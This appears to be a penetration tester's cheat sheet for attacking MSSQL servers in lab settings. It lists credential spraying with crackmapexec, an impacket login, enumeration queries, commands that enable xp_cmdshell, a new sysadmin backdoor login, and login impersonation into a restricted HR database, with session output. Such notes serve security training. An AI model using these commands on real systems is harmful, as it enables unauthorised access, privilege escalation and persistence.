### Crackmapexec 
```
sudo crackmapexec mssql 10.10.11.202 -u 'PublicUser' -p 'GuestUserCantWrite1' 
sudo crackmapexec mssql 10.10.11.202 --local-auth -u 'PublicUser' -p 'GuestUserCantWrite1' # using Local Auth 
```
### Login into MSSQL 
```
$ impacket-mssqlclient discovery:'Start123!'@192.168.217.40  -windows-auth
```

### queries to run 
```
# Get version
select @@version;
# Get user
select user_name();

#show database 
SELECT name FROM master..sysdatabases;

# Use database
USE master

#Get table names
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
SELECT * FROM information_schema.tables

# Get table content
> SELECT * FROM <database_name>.dbo.<table_name>

# Check if the current user have permission to execute OS command
> USE master
> EXEC sp_helprotect 'xp_cmdshell'

# Get linked servers
> EXEC sp_linkedservers
> SELECT * FROM sys.servers

# Create a new user with sysadmin privilege
> CREATE LOGIN tester WITH PASSWORD = 'password'
> EXEC sp_addsrvrolemember 'tester', 'sysadmin'

# List directories
> xp_dirtree '.\'
> xp_dirtree 'C:\inetpub\'
> xp_dirtree 'C:\inetpub\wwwroot\'
> xp_dirtree 'C:\Users\'

> enable_xp_cmdshell

# Enable advanced options
> EXEC sp_configure 'show advanced options', 1;
# Update the currently configured value for the advanced options
> RECONFIGURE;

# Enable the command shell
> EXEC sp_configure 'xp_cmdshell', 1;
# Update the currently configured value for the command shell
> RECONFIGURE;
```
#### If current user does not have permission o view database - Notion 

```
SQL (HAERO\discovery  guest@master)> use hrappdb
ERROR: Line 1: The server principal "HAERO\discovery" is not able to access the database "hrappdb" under the current security context.
```
```
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
name             
--------------   
hrappdb-reader
```
#### we can impersonate. lets login as that user
```
SQL (HAERO\discovery  guest@master)> EXECUTE AS LOGIN = 'hrappdb-reader'
SQL (hrappdb-reader  guest@master)> use hrappdb
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: hrappdb
[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'hrappdb'.
```
```
SQL (hrappdb-reader  hrappdb-reader@hrappdb)> SELECT * FROM hrappdb.INFORMATION_SCHEMA.TABLES;
TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE   
-------------   ------------   ----------   ----------   
hrappdb         dbo            sysauth      b'BASE TABLE'
```


